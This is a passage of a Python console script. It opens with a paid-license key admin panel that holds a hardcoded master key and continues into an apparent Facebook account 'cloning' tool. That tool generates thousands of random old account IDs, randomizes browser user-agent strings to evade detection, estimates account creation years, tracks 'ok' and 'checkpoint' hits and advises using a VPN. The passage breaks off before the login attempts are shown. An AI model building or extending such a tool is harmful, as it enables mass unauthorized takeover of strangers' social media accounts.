                print(f"{C}{'║'}{' ' * 4}{G}5{RESET} → {W}12 Hours{C}{' ' * 28}{'║'}{RESET}")
                print(f"{C}{'║'}{' ' * 4}{G}6{RESET} → {W}24 Hours (1 Day){C}{' ' * 23}{'║'}{RESET}")
                print(f"{C}{'║'}{' ' * 4}{R}0{RESET} → {W}Cancel{C}{' ' * 29}{'║'}{RESET}")
                print(f"{C}{'╚' + '═' * 46 + '╝'}{RESET}")
                
                while True:
                    hour_choice = input(f"{G}{' ' * 8}[?] SELECT (0-6): {RESET}")
                    if hour_choice == '0':
                        print(f"{Y}[!]{RESET} Cancelled.")
                        return
                    if hour_choice in ('1','2','3','4','5','6'):
                        break
                    print(f"\n{R}{' ' * 8}[!] Invalid! Please enter 0-6{RESET}")
                    time.sleep(1)
                    os.system("clear")
                    banner()
                    print(f"{C}{'=' * 60}{RESET}")
                    print(f"{C}{' ' * 20}RENEW KEY BY VALUE{RESET}")
                    print(f"{C}{'=' * 60}{RESET}")
                    print(f"\n{Y}[!]{RESET} Current expiry: {item['expiry']}")
                    print(f"\n{G}What do you want to add?{RESET}")
                    print(f"{C}   1. Add Days{RESET}")
                    print(f"{C}   2. Add Hours{RESET}")
                    print(f"{R}   0. Cancel{RESET}")
                    print(f"\n{C}{'╔' + '═' * 46 + '╗'}{RESET}")
                    print(f"{C}{'║'}{' ' * 12}{Y}SELECT HOURS{RESET}{' ' * 24}{C}{'║'}{RESET}")
                    print(f"{C}{'╠' + '═' * 46 + '╣'}{RESET}")
                    print(f"{C}{'║'}{' ' * 4}{G}1{RESET} → {W}1 Hour{C}{' ' * 30}{'║'}{RESET}")
                    print(f"{C}{'║'}{' ' * 4}{G}2{RESET} → {W}2 Hours{C}{' ' * 29}{'║'}{RESET}")
                    print(f"{C}{'║'}{' ' * 4}{G}3{RESET} → {W}3 Hours{C}{' ' * 29}{'║'}{RESET}")
                    print(f"{C}{'║'}{' ' * 4}{G}4{RESET} → {W}6 Hours{C}{' ' * 29}{'║'}{RESET}")
                    print(f"{C}{'║'}{' ' * 4}{G}5{RESET} → {W}12 Hours{C}{' ' * 28}{'║'}{RESET}")
                    print(f"{C}{'║'}{' ' * 4}{G}6{RESET} → {W}24 Hours (1 Day){C}{' ' * 23}{'║'}{RESET}")
                    print(f"{C}{'║'}{' ' * 4}{R}0{RESET} → {W}Cancel{C}{' ' * 29}{'║'}{RESET}")
                    print(f"{C}{'╚' + '═' * 46 + '╝'}{RESET}")
                
                hour_options = {
                    '1': 1, '2': 2, '3': 3, '4': 6, '5': 12, '6': 24
                }
                hours = hour_options[hour_choice]
                
                # Add hours to expiry
                if " " in item["expiry"]:
                    old_expiry = datetime.strptime(item["expiry"], "%Y-%m-%d %H:%M:%S")
                    new_expiry = old_expiry + timedelta(hours=hours)
                    item["expiry"] = new_expiry.strftime("%Y-%m-%d %H:%M:%S")
                else:
                    old_expiry = datetime.strptime(item["expiry"], "%Y-%m-%d").date()
                    new_expiry = datetime.combine(old_expiry, datetime.min.time()) + timedelta(hours=hours)
                    item["expiry"] = new_expiry.strftime("%Y-%m-%d %H:%M:%S")
            
            save_approved_keys(keys)
            push_to_github()
            print(f"\n{G}{'=' * 60}{RESET}")
            print(f"{G}[✓]{RESET} Key renewed successfully!")
            print(f"{G}[+]{RESET} Key: {item['key']}")
            print(f"{G}[+]{RESET} New expiry: {item['expiry']}")
            print(f"{G}{'=' * 60}{RESET}")
            speak("Key renewed successfully")
            return
    
    if not found:
        print(f"{R}[-]{RESET} Key '{user_key}' not found in database!")
        print(f"{Y}[!] Press ENTER to go back{RESET}")
        input()

# ========== ADMIN PANEL ==========
def admin_panel():
    while True:
        banner()
        print(f"{C}{'=' * 60}{RESET}")
        print(f"{C}{' ' * 22}ADMIN PANEL{RESET}")
        print(f"{C}{'=' * 60}{RESET}")
        print(f"\n{G}{' ' * 15}1. Add New Key (With Days){RESET}")
        print(f"{G}{' ' * 15}2. Add Unlimited Key{RESET}")
        print(f"{Y}{' ' * 15}3. Add Key (With Hours){RESET}")
        print(f"{C}{' ' * 15}4. Renew Key By Value (Paste Key){RESET}")
        print(f"{R}{' ' * 15}5. Delete Key (By Number or Key){RESET}")
        print(f"{C}{' ' * 15}6. Show All Keys{RESET}")
        print(f"{R}{' ' * 15}7. Show Expired Keys Only{RESET}")
        print(f"{R}{' ' * 15}8. Delete ALL Keys{RESET}")
        print(f"{B}{' ' * 15}9. Back to Main Menu{RESET}\n")
        print(f"{C}{'=' * 60}{RESET}")
        
        while True:
            choice = input(f"{G}>>>{RESET} Choose (1-9): ")
            if choice in ('1','2','3','4','5','6','7','8','9'):
                break
            print(f"\n{R}{' ' * 8}[!] Invalid! Please enter 1-9{RESET}")
            time.sleep(1)
            os.system("clear")
            banner()
            print(f"{C}{'=' * 60}{RESET}")
            print(f"{C}{' ' * 22}ADMIN PANEL{RESET}")
            print(f"{C}{'=' * 60}{RESET}")
            print(f"\n{G}{' ' * 15}1. Add New Key (With Days){RESET}")
            print(f"{G}{' ' * 15}2. Add Unlimited Key{RESET}")
            print(f"{Y}{' ' * 15}3. Add Key (With Hours){RESET}")
            print(f"{C}{' ' * 15}4. Renew Key By Value (Paste Key){RESET}")
            print(f"{R}{' ' * 15}5. Delete Key (By Number or Key){RESET}")
            print(f"{C}{' ' * 15}6. Show All Keys{RESET}")
            print(f"{R}{' ' * 15}7. Show Expired Keys Only{RESET}")
            print(f"{R}{' ' * 15}8. Delete ALL Keys{RESET}")
            print(f"{B}{' ' * 15}9. Back to Main Menu{RESET}\n")
            print(f"{C}{'=' * 60}{RESET}")
        
        # ========== OPTION 1: ADD NEW KEY (WITH DAYS) ==========
        if choice == "1":
            while True:
                new_key = input(f"{Y}Enter new key (or 0 to cancel):{RESET} ").strip().upper()
                if new_key == '0':
                    print(f"{Y}[!]{RESET} Cancelled.")
                    break
                if new_key:
                    break
                print(f"\n{R}{' ' * 8}[!] Input cannot be empty!{RESET}")
                time.sleep(1)
                os.system("clear")
                banner()
                print(f"{C}{'=' * 60}{RESET}")
                print(f"{C}{' ' * 22}ADMIN PANEL{RESET}")
                print(f"{C}{'=' * 60}{RESET}")
                print(f"\n{G}{' ' * 15}1. Add New Key (With Days){RESET}")
            
            if new_key != '0':
                print(f"{C}{'╔' + '═' * 46 + '╗'}{RESET}")
                print(f"{C}{'║'}{' ' * 12}{Y}SELECT DURATION{RESET}{' ' * 24}{C}{'║'}{RESET}")
                print(f"{C}{'╠' + '═' * 46 + '╣'}{RESET}")
                print(f"{C}{'║'}{' ' * 4}{G}1{RESET} → {W}3 Days (72 hours){C}{' ' * 23}{'║'}{RESET}")
                print(f"{C}{'║'}{' ' * 4}{G}2{RESET} → {W}7 Days (1 week){C}{' ' * 24}{'║'}{RESET}")
                print(f"{C}{'║'}{' ' * 4}{G}3{RESET} → {W}1 Month (30 days){C}{' ' * 22}{'║'}{RESET}")
                print(f"{C}{'║'}{' ' * 4}{G}4{RESET} → {W}2 Months (60 days){C}{' ' * 22}{'║'}{RESET}")
                print(f"{C}{'║'}{' ' * 4}{G}5{RESET} → {W}3 Months (90 days){C}{' ' * 22}{'║'}{RESET}")
                print(f"{C}{'║'}{' ' * 4}{G}6{RESET} → {W}4 Months (120 days){C}{' ' * 21}{'║'}{RESET}")
                print(f"{C}{'║'}{' ' * 4}{G}7{RESET} → {W}5 Months (150 days){C}{' ' * 21}{'║'}{RESET}")
                print(f"{C}{'║'}{' ' * 4}{G}8{RESET} → {W}6 Months (180 days){C}{' ' * 21}{'║'}{RESET}")
                print(f"{C}{'║'}{' ' * 4}{G}9{RESET} → {W}12 Months (365 days){C}{' ' * 20}{'║'}{RESET}")
                print(f"{C}{'║'}{' ' * 4}{R}0{RESET} → {W}Cancel{C}{' ' * 29}{'║'}{RESET}")
                print(f"{C}{'╚' + '═' * 46 + '╝'}{RESET}")
                
                while True:
                    month_choice = input(f"{G}{' ' * 8}[?] SELECT (0-9): {RESET}")
                    if month_choice == '0':
                        print(f"{Y}[!]{RESET} Cancelled.")
                        break
                    if month_choice in ('1','2','3','4','5','6','7','8','9'):
                        month_days = {
                            '1': 3, '2': 7, '3': 30, '4': 60, '5': 90,
                            '6': 120, '7': 150, '8': 180, '9': 365
                        }
                        days = month_days[month_choice]
                        add_new_key(new_key, days)
                        break
                    print(f"\n{R}{' ' * 8}[!] Invalid! Please enter 0-9{RESET}")
                    time.sleep(1)
                    os.system("clear")
                    banner()
                    print(f"{C}{'=' * 60}{RESET}")
                    print(f"{C}{' ' * 22}ADMIN PANEL{RESET}")
                    print(f"{C}{'=' * 60}{RESET}")
                    print(f"\n{G}{' ' * 15}1. Add New Key (With Days){RESET}")
                    print(f"{C}{'╔' + '═' * 46 + '╗'}{RESET}")
                    print(f"{C}{'║'}{' ' * 12}{Y}SELECT DURATION{RESET}{' ' * 24}{C}{'║'}{RESET}")
                    print(f"{C}{'╠' + '═' * 46 + '╣'}{RESET}")
                    print(f"{C}{'║'}{' ' * 4}{G}1{RESET} → {W}3 Days (72 hours){C}{' ' * 23}{'║'}{RESET}")
                    print(f"{C}{'║'}{' ' * 4}{G}2{RESET} → {W}7 Days (1 week){C}{' ' * 24}{'║'}{RESET}")
                    print(f"{C}{'║'}{' ' * 4}{G}3{RESET} → {W}1 Month (30 days){C}{' ' * 22}{'║'}{RESET}")
                    print(f"{C}{'║'}{' ' * 4}{G}4{RESET} → {W}2 Months (60 days){C}{' ' * 22}{'║'}{RESET}")
                    print(f"{C}{'║'}{' ' * 4}{G}5{RESET} → {W}3 Months (90 days){C}{' ' * 22}{'║'}{RESET}")
                    print(f"{C}{'║'}{' ' * 4}{G}6{RESET} → {W}4 Months (120 days){C}{' ' * 21}{'║'}{RESET}")
                    print(f"{C}{'║'}{' ' * 4}{G}7{RESET} → {W}5 Months (150 days){C}{' ' * 21}{'║'}{RESET}")
                    print(f"{C}{'║'}{' ' * 4}{G}8{RESET} → {W}6 Months (180 days){C}{' ' * 21}{'║'}{RESET}")
                    print(f"{C}{'║'}{' ' * 4}{G}9{RESET} → {W}12 Months (365 days){C}{' ' * 20}{'║'}{RESET}")
                    print(f"{C}{'║'}{' ' * 4}{R}0{RESET} → {W}Cancel{C}{' ' * 29}{'║'}{RESET}")
                    print(f"{C}{'╚' + '═' * 46 + '╝'}{RESET}")
        
        # ========== OPTION 2: ADD UNLIMITED KEY ==========
        elif choice == "2":
            while True:
                new_key = input(f"{Y}Enter new key (or 0 to cancel):{RESET} ").strip().upper()
                if new_key == '0':
                    print(f"{Y}[!]{RESET} Cancelled.")
                    break
                if new_key:
                    add_new_key(new_key, "unlimited")
                    break
                print(f"\n{R}{' ' * 8}[!] Input cannot be empty!{RESET}")
                time.sleep(1)
                os.system("clear")
                banner()
                print(f"{C}{'=' * 60}{RESET}")
                print(f"{C}{' ' * 22}ADMIN PANEL{RESET}")
                print(f"{C}{'=' * 60}{RESET}")
                print(f"\n{G}{' ' * 15}2. Add Unlimited Key{RESET}")
        
        # ========== OPTION 3: ADD KEY WITH HOURS ==========
        elif choice == "3":
            while True:
                new_key = input(f"{Y}Enter new key (or 0 to cancel):{RESET} ").strip().upper()
                if new_key == '0':
                    print(f"{Y}[!]{RESET} Cancelled.")
                    break
                if new_key:
                    break
                print(f"\n{R}{' ' * 8}[!] Input cannot be empty!{RESET}")
                time.sleep(1)
                os.system("clear")
                banner()
                print(f"{C}{'=' * 60}{RESET}")
                print(f"{C}{' ' * 22}ADMIN PANEL{RESET}")
                print(f"{C}{'=' * 60}{RESET}")
                print(f"\n{Y}{' ' * 15}3. Add Key (With Hours){RESET}")
            
            if new_key != '0':
                print(f"{C}{'╔' + '═' * 46 + '╗'}{RESET}")
                print(f"{C}{'║'}{' ' * 12}{Y}SELECT HOURS{RESET}{' ' * 24}{C}{'║'}{RESET}")
                print(f"{C}{'╠' + '═' * 46 + '╣'}{RESET}")
                print(f"{C}{'║'}{' ' * 4}{G}1{RESET} → {W}1 Hour{C}{' ' * 30}{'║'}{RESET}")
                print(f"{C}{'║'}{' ' * 4}{G}2{RESET} → {W}2 Hours{C}{' ' * 29}{'║'}{RESET}")
                print(f"{C}{'║'}{' ' * 4}{G}3{RESET} → {W}3 Hours{C}{' ' * 29}{'║'}{RESET}")
                print(f"{C}{'║'}{' ' * 4}{G}4{RESET} → {W}6 Hours{C}{' ' * 29}{'║'}{RESET}")
                print(f"{C}{'║'}{' ' * 4}{G}5{RESET} → {W}12 Hours{C}{' ' * 28}{'║'}{RESET}")
                print(f"{C}{'║'}{' ' * 4}{G}6{RESET} → {W}24 Hours (1 Day){C}{' ' * 23}{'║'}{RESET}")
                print(f"{C}{'║'}{' ' * 4}{R}0{RESET} → {W}Cancel{C}{' ' * 29}{'║'}{RESET}")
                print(f"{C}{'╚' + '═' * 46 + '╝'}{RESET}")
                
                while True:
                    hour_choice = input(f"{G}{' ' * 8}[?] SELECT (0-6): {RESET}")
                    if hour_choice == '0':
                        print(f"{Y}[!]{RESET} Cancelled.")
                        break
                    if hour_choice in ('1','2','3','4','5','6'):
                        hour_options = {
                            '1': 1, '2': 2, '3': 3, '4': 6, '5': 12, '6': 24
                        }
                        hours = hour_options[hour_choice]
                        add_hours_key(new_key, hours)
                        break
                    print(f"\n{R}{' ' * 8}[!] Invalid! Please enter 0-6{RESET}")
                    time.sleep(1)
                    os.system("clear")
                    banner()
                    print(f"{C}{'=' * 60}{RESET}")
                    print(f"{C}{' ' * 22}ADMIN PANEL{RESET}")
                    print(f"{C}{'=' * 60}{RESET}")
                    print(f"\n{Y}{' ' * 15}3. Add Key (With Hours){RESET}")
                    print(f"{C}{'╔' + '═' * 46 + '╗'}{RESET}")
                    print(f"{C}{'║'}{' ' * 12}{Y}SELECT HOURS{RESET}{' ' * 24}{C}{'║'}{RESET}")
                    print(f"{C}{'╠' + '═' * 46 + '╣'}{RESET}")
                    print(f"{C}{'║'}{' ' * 4}{G}1{RESET} → {W}1 Hour{C}{' ' * 30}{'║'}{RESET}")
                    print(f"{C}{'║'}{' ' * 4}{G}2{RESET} → {W}2 Hours{C}{' ' * 29}{'║'}{RESET}")
                    print(f"{C}{'║'}{' ' * 4}{G}3{RESET} → {W}3 Hours{C}{' ' * 29}{'║'}{RESET}")
                    print(f"{C}{'║'}{' ' * 4}{G}4{RESET} → {W}6 Hours{C}{' ' * 29}{'║'}{RESET}")
                    print(f"{C}{'║'}{' ' * 4}{G}5{RESET} → {W}12 Hours{C}{' ' * 28}{'║'}{RESET}")
                    print(f"{C}{'║'}{' ' * 4}{G}6{RESET} → {W}24 Hours (1 Day){C}{' ' * 23}{'║'}{RESET}")
                    print(f"{C}{'║'}{' ' * 4}{R}0{RESET} → {W}Cancel{C}{' ' * 29}{'║'}{RESET}")
                    print(f"{C}{'╚' + '═' * 46 + '╝'}{RESET}")
        
        # ========== OPTION 4: RENEW KEY ==========
        elif choice == "4":
            renew_key_by_value()
        
        # ========== OPTION 5: DELETE KEY (Number OR Key - Direct) ==========
        elif choice == "5":
            show_all_keys()
            print(f"\n{Y}[!]{RESET} You can delete by:")
            print(f"{C}   - Number (e.g., 4){RESET}")
            print(f"{C}   - Key Value (e.g., SIYAM-EDB2D7){RESET}")
            print(f"{R}   - 0 to Cancel{RESET}\n")
            
            while True:
                delete_input = input(f"{R}Enter number or key to delete:{RESET} ").strip().upper()
                
                if delete_input == '0':
                    print(f"{Y}[!]{RESET} Cancelled.")
                    break
                
                # Try to delete by number first
                try:
                    idx = int(delete_input)
                    if 1 <= idx <= len(load_approved_keys()):
                        remove_key_by_index(idx)
                        break
                    else:
                        print(f"\n{R}{' ' * 8}[!] Invalid number! Choose 1-{len(load_approved_keys())}{RESET}")
                        time.sleep(1)
                        os.system("clear")
                        banner()
                        print(f"{C}{'=' * 60}{RESET}")
                        print(f"{C}{' ' * 22}ADMIN PANEL{RESET}")
                        print(f"{C}{'=' * 60}{RESET}")
                        show_all_keys()
                        print(f"\n{Y}[!]{RESET} You can delete by:")
                        print(f"{C}   - Number (e.g., 4){RESET}")
                        print(f"{C}   - Key Value (e.g., SIYAM-EDB2D7){RESET}")
                        print(f"{R}   - 0 to Cancel{RESET}\n")
                        continue
                except ValueError:
                    # Not a number, try to delete by key value
                    keys = load_approved_keys()
                    found_index = None
                    for i, item in enumerate(keys, 1):
                        if item["key"] == delete_input:
                            found_index = i
                            break
                    
                    if found_index:
                        removed = keys.pop(found_index - 1)
                        save_approved_keys(keys)
                        push_to_github()
                        print(f"{G}[+]{RESET} Deleted: {removed['key']}")
                        break
                    else:
                        print(f"\n{R}{' ' * 8}[!] Key '{delete_input}' not found!{RESET}")
                        time.sleep(1)
                        os.system("clear")
                        banner()
                        print(f"{C}{'=' * 60}{RESET}")
                        print(f"{C}{' ' * 22}ADMIN PANEL{RESET}")
                        print(f"{C}{'=' * 60}{RESET}")
                        show_all_keys()
                        print(f"\n{Y}[!]{RESET} You can delete by:")
                        print(f"{C}   - Number (e.g., 4){RESET}")
                        print(f"{C}   - Key Value (e.g., SIYAM-EDB2D7){RESET}")
                        print(f"{R}   - 0 to Cancel{RESET}\n")
                        continue
        
        # ========== OPTION 6: SHOW ALL KEYS ==========
        elif choice == "6":
            show_all_keys()
            print(f"\n{Y}[!] Press ENTER to go back{RESET}")
            input()
        
        # ========== OPTION 7: SHOW EXPIRED KEYS ONLY ==========
        elif choice == "7":
            show_all_keys(show_expired_only=True)
            print(f"\n{Y}[!] Press ENTER to go back{RESET}")
            input()
        
        # ========== OPTION 8: DELETE ALL KEYS ==========
        elif choice == "8":
            print(f"\n{R}{'='*60}{RESET}")
            print(f"{R}{' ' * 20}⚠️ DANGER ZONE ⚠️{RESET}")
            print(f"{R}{'='*60}{RESET}")
            print(f"{Y}[!] This will DELETE ALL approved keys except master key!{RESET}")
            confirm = input(f"{R}Type 'DELETE ALL' to confirm (or 0 to cancel): {RESET}")
            if confirm == "0":
                print(f"{Y}[!]{RESET} Cancelled.")
            elif confirm == "DELETE ALL":
                keys = [{"key": "SIYAM-MAHMUD-2022", "expiry": "unlimited"}]
                save_approved_keys(keys)
                push_to_github()
                print(f"{G}[✓]{RESET} All keys deleted! Only master key remains.")
            else:
                print(f"{Y}[!]{RESET} Cancelled.")
        
        # ========== OPTION 9: BACK TO MAIN MENU ==========
        elif choice == "9":
            print(f"{G}[+]{RESET} Going back to main menu...")
            time.sleep(0.5)
            return
        
        # Press ENTER to continue (except for options that already have their own pause)
        if choice not in ('4', '6', '7', '9'):
            if choice == '5':
                # For delete, already shows result, just wait
                if delete_input != '0':
                    input(f"\n{Y}[Press ENTER to continue]{RESET}")
            else:
                input(f"\n{Y}[Press ENTER to continue]{RESET}")

# ========== FACEBOOK TOOL CODE ==========
method = []
oks = []
cps = []
loop = 0
user = []

X = '\x1b[1;37m'
rad = '\x1b[38;5;196m'
G2 = '\x1b[38;5;46m'
Y2 = '\x1b[38;5;220m'
PP = '\x1b[38;5;203m'
RR = '\x1b[38;5;196m'
GS = '\x1b[38;5;40m'
W2 = '\x1b[1;37m'

def windows():
    aV = str(random.choice(range(10, 20)))
    A = f"Mozilla/5.0 (Windows; U; Windows NT {str(random.choice(range(5, 7)))}.1; en-US) AppleWebKit/534.{aV} (KHTML, like Gecko) Chrome/{str(random.choice(range(8, 12)))}.0.{str(random.choice(range(552, 661)))}.0 Safari/534.{aV}"
    bV = str(random.choice(range(1, 36)))
    bx = str(random.choice(range(34, 38)))
    bz = f'5{bx}.{bV}'
    B = f"Mozilla/5.0 (Windows NT {str(random.choice(range(5, 7)))}.{str(random.choice(['2', '1']))}) AppleWebKit/{bz} (KHTML, like Gecko) Chrome/{str(random.choice(range(12, 42)))}.0.{str(random.choice(range(742, 2200)))}.{str(random.choice(range(1, 120)))} Safari/{bz}"
    cV = str(random.choice(range(1, 36)))
    cx = str(random.choice(range(34, 38)))
    cz = f'5{cx}.{cV}'
    C2 = f"Mozilla/5.0 (Windows NT 6.{str(random.choice(['2', '1']))}; WOW64) AppleWebKit/{cz} (KHTML, like Gecko) Chrome/{str(random.choice(range(12, 42)))}.0.{str(random.choice(range(742, 2200)))}.{str(random.choice(range(1, 120)))} Safari/{cz}"
    D = f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.{str(random.choice(range(1, 7120)))}.0 Safari/537.36"
    return random.choice([A, B, C2, D])

def window1():
    aV = str(random.choice(range(10, 20)))
    A = f"Mozilla/5.0 (Windows; U; Windows NT {random.choice(range(6, 11))}.0; en-US) AppleWebKit/534.{aV} (KHTML, like Gecko) Chrome/{random.choice(range(80, 122))}.0.{random.choice(range(4000, 7000))}.0 Safari/534.{aV}"
    bV = str(random.choice(range(1, 36)))
    bx = str(random.choice(range(34, 38)))
    bz = f'5{bx}.{bV}'
    B = f"Mozilla/5.0 (Windows NT {random.choice(range(6, 11))}.{random.choice(['0', '1'])}) AppleWebKit/{bz} (KHTML, like Gecko) Chrome/{random.choice(range(80, 122))}.0.{random.choice(range(4000, 7000))}.{random.choice(range(50, 200))} Safari/{bz}"
    cV = str(random.choice(range(1, 36)))
    cx = str(random.choice(range(34, 38)))
    cz = f'5{cx}.{cV}'
    C2 = f"Mozilla/5.0 (Windows NT 6.{random.choice(['0', '1', '2'])}; WOW64) AppleWebKit/{cz} (KHTML, like Gecko) Chrome/{random.choice(range(80, 122))}.0.{random.choice(range(4000, 7000))}.{random.choice(range(50, 200))} Safari/{cz}"
    latest_build = random.randint(6000, 9000)
    latest_patch = random.randint(100, 200)
    D = f"Mozilla/5.0 (Windows NT {random.choice(['10.0', '11.0'])}; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.{latest_build}.{latest_patch} Safari/537.36"
    return random.choice([A, B, C2, D])

def creationyear(uid):
    uid_str = str(uid)
    if len(uid_str) == 15:
        if uid_str.startswith('1000000000'):
            return '2009'
        if uid_str.startswith('100000000'):
            return '2009'
        if uid_str.startswith('10000000'):
            return '2009'
        if uid_str.startswith(('1000000', '1000001', '1000002', '1000003', '1000004', '1000005')):
            return '2009'
        if uid_str.startswith(('1000006', '1000007', '1000008', '1000009')):
            return '2010'
        if uid_str.startswith('100001'):
            return '2010'
        if uid_str.startswith(('100002', '100003')):
            return '2011'
        if uid_str.startswith('100004'):
            return '2012'
        if uid_str.startswith(('100005', '100006')):
            return '2013'
        if uid_str.startswith(('100007', '100008')):
            return '2014'
        if uid_str.startswith('100009'):
            return '2015'
        if uid_str.startswith('10001'):
            return '2016'
        if uid_str.startswith('10002'):
            return '2017'
        if uid_str.startswith('10003'):
            return '2018'
        if uid_str.startswith('10004'):
            return '2019'
        if uid_str.startswith('10005'):
            return '2020'
        if uid_str.startswith('10006'):
            return '2021'
        if uid_str.startswith('10007'):
            return '2022'
        if uid_str.startswith('10008'):
            return '2023'
        if uid_str.startswith('10009'):
            return '2024'
        if uid_str.startswith('10010'):
            return '2025'
        if uid_str.startswith('10011'):
            return '2026'
        return 'Unknown'
    elif len(uid_str) in (9, 10):
        return '2008'
    elif len(uid_str) == 8:
        return '2007'
    elif len(uid_str) == 7:
        return '2006'
    elif len(uid_str) == 14 and uid_str.startswith('61'):
        return '2024'
    else:
        if len(uid_str) <= 6:
            return '2004'
        elif len(uid_str) <= 7:
            return '2005'
        else:
            return '2006'

def linex():
    print(f"{C}{'═' * 50}{RESET}")

def BNG_71_():
    while True:
        banner()
        print()
        print(f"{C}{'╔' + '═' * 48 + '╗'}{RESET}")
        print(f"{C}{'║'}{' ' * 48}{C}{'║'}{RESET}")
        print(f"{C}{'║'}{' ' * 12}{Y}(A) OLD FACEBOOK CLONE ID{RESET}{C}{' ' * 19}{'║'}{RESET}")
        print(f"{C}{'║'}{' ' * 48}{C}{'║'}{RESET}")
        print(f"{C}{'╠' + '═' * 48 + '╣'}{RESET}")
        print(f"{C}{'║'}{' ' * 4}{W}📡 VPN:{RESET} {ORANGE}Recommended: Japan / US / Singapore{C}{' ' * 9}{'║'}{RESET}")
        print(f"{C}{'║'}{' ' * 48}{C}{'║'}{RESET}")
        print(f"{C}{'╚' + '═' * 48 + '╝'}{RESET}")
        print()
        
        choice = input(f"{G}{' ' * 8}[?] CHOICE: {RESET}")
        if choice.upper() in ('A', '1', 'a'):
            old_clone()
            break
        else:
            print(f"\n{R}{' ' * 8}[!] Invalid! Please enter A{RESET}")
            time.sleep(1)
            os.system("clear")
            continue

def old_clone():
    while True:
        banner()
        print()
        print(f"{C}{'╔' + '═' * 48 + '╗'}{RESET}")
        print(f"{C}{'║'}{' ' * 48}{C}{'║'}{RESET}")
        print(f"{C}{'║'}{' ' * 14}{Y}📋 SELECT SERIES{RESET}{C}{' ' * 24}{'║'}{RESET}")
        print(f"{C}{'║'}{' ' * 48}{C}{'║'}{RESET}")
        print(f"{C}{'╠' + '═' * 48 + '╣'}{RESET}")
        print_option_box("A)", "All Series Old Id", G)
        print_option_box("B)", "2010-2018 Id", G)
        print_option_box("C)", "Only-2009 Id", G)
        print(f"{C}{'║'}{' ' * 48}{C}{'║'}{RESET}")
        print(f"{C}{'╚' + '═' * 48 + '╝'}{RESET}")
        print()
        
        _input = input(f"{G}{' ' * 8}[?] CHOICE: {RESET}")
        if _input.upper() in ('A', '1', 'a'):
            old_One()
            break
        elif _input.upper() in ('B', '2', 'b'):
            old_Tow()
            break
        elif _input.upper() in ('C', '3', 'c'):
            old_Tree()
            break
        else:
            print(f"\n{R}{' ' * 8}[!] Invalid! Please enter A,B or C{RESET}")
            time.sleep(1)
            os.system("clear")
            continue

def old_One():
    user = []
    banner()
    print()
    print(f"{C}{'╔' + '═' * 48 + '╗'}{RESET}")
    print(f"{C}{'║'}{' ' * 48}{C}{'║'}{RESET}")
    print(f"{C}{'║'}{' ' * 10}{Y}2009-2012{RESET}{C}{' ' * 17}{'║'}{RESET}")
    print(f"{C}{'║'}{' ' * 48}{C}{'║'}{RESET}")
    print(f"{C}{'╚' + '═' * 48 + '╝'}{RESET}")
    print()
    
    ask = input(f"{G}{' ' * 8}[?] SELECT: {RESET}")
    linex()
    
    banner()
    print()
    print(f"{C}{'╔' + '═' * 48 + '╗'}{RESET}")
    print(f"{C}{'║'}{' ' * 48}{C}{'║'}{RESET}")
    print(f"{C}{'║'}{' ' * 10}{Y}2009-2012 All Series{RESET}{C}{' ' * 17}{'║'}{RESET}")
    print(f"{C}{'║'}{' ' * 48}{C}{'║'}{RESET}")
    print(f"{C}{'╚' + '═' * 48 + '╝'}{RESET}")
    print()
    
    linex()
    
    banner()
    print()
    print(f"{C}{'╔' + '═' * 48 + '╗'}{RESET}")
    print(f"{C}{'║'}{' ' * 48}{C}{'║'}{RESET}")
    print(f"{C}{'║'}{' ' * 8}{Y}📊 HOW MANY IDS?{RESET}{C}{' ' * 23}{'║'}{RESET}")
    print(f"{C}{'║'}{' ' * 48}{C}{'║'}{RESET}")
    print(f"{C}{'║'}{' ' * 4}{W}📝 Example:{RESET} {G}20000 / 30000 / 99999{C}{' ' * 9}{'║'}{RESET}")
    print(f"{C}{'╚' + '═' * 48 + '╝'}{RESET}")
    print()
    
    while True:
        try:
            limit = int(input(f"{G}{' ' * 8}[?] TOTAL ID COUNT: {RESET}"))
            if limit > 0:
                break
            print(f"\n{R}{' ' * 8}[!] Please enter a positive number!{RESET}")
            time.sleep(1)
            os.system("clear")
            banner()
            print()
            print(f"{C}{'╔' + '═' * 48 + '╗'}{RESET}")
            print(f"{C}{'║'}{' ' * 48}{C}{'║'}{RESET}")
            print(f"{C}{'║'}{' ' * 8}{Y}📊 HOW MANY IDS?{RESET}{C}{' ' * 23}{'║'}{RESET}")
            print(f"{C}{'║'}{' ' * 48}{C}{'║'}{RESET}")
            print(f"{C}{'║'}{' ' * 4}{W}📝 Example:{RESET} {G}20000 / 30000 / 99999{C}{' ' * 9}{'║'}{RESET}")
            print(f"{C}{'╚' + '═' * 48 + '╝'}{RESET}")
            print()
        except ValueError:
            print(f"\n{R}{' ' * 8}[!] Invalid! Please enter a number!{RESET}")
            time.sleep(1)
            os.system("clear")
            banner()
            print()
            print(f"{C}{'╔' + '═' * 48 + '╗'}{RESET}")
            print(f"{C}{'║'}{' ' * 48}{C}{'║'}{RESET}")
            print(f"{C}{'║'}{' ' * 8}{Y}📊 HOW MANY IDS?{RESET}{C}{' ' * 23}{'║'}{RESET}")
            print(f"{C}{'║'}{' ' * 48}{C}{'║'}{RESET}")
            print(f"{C}{'║'}{' ' * 4}{W}📝 Example:{RESET} {G}20000 / 30000 / 99999{C}{' ' * 9}{'║'}{RESET}")
            print(f"{C}{'╚' + '═' * 48 + '╝'}{RESET}")
            print()
    
    linex()
    
    star = '10000'
    print(f"{Y}{' ' * 8}[⏳] Generating {limit} IDs...{RESET}")
    for _ in range(limit):
        if ask == '1':
            data = str(random.randint(1000000000, 1999999999))
        else:
            data = str(random.randint(1000000000, 4999999999))
        user.append(data)
    
    banner()
    print()
    print(f"{C}{'╔' + '═' * 48 + '╗'}{RESET}")
    print(f"{C}{'║'}{' ' * 48}{C}{'║'}{RESET}")
    print(f"{C}{'║'}{' ' * 14}{Y}🔧 SELECT METHOD{RESET}{C}{' ' * 20}{'║'}{RESET}")
    print(f"{C}{'║'}{' ' * 48}{C}{'║'}{RESET}")
    print(f"{C}{'╠' + '═' * 48 + '╣'}{RESET}")
    print_option_box("A)", "METHOD 1", G)
    print_option_box("B)", "METHOD 2", G)
    print(f"{C}{'║'}{' ' * 48}{C}{'║'}{RESET}")
    print(f"{C}{'╚' + '═' * 48 + '╝'}{RESET}")
    print()
    
    while True:
        meth = input(f"{G}{' ' * 8}[?] CHOICE (A/B): {RESET}").strip()
        if meth == 'A' or meth == 'a' or meth == '1':
            meth = 'A'
            break
        elif meth == 'B' or meth == 'b' or meth == '2':
